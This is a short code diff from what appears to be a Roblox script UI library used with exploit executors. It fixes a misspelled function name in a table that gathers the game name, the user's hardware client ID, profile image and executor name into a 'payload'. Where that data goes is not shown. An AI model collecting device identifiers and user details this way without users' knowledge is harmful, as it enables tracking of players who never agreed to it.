@@ -1559,7 +1559,7 @@ function lib:CreateWindow(name)
           GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
           HWID = game:GetService("RbxAnalyticsService"):GetClientId(),
           ProfileImage = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png",
-          Executer = indentifyexecuter()
+          Executer = identifyexecuter()
       }
   
       local payload = {
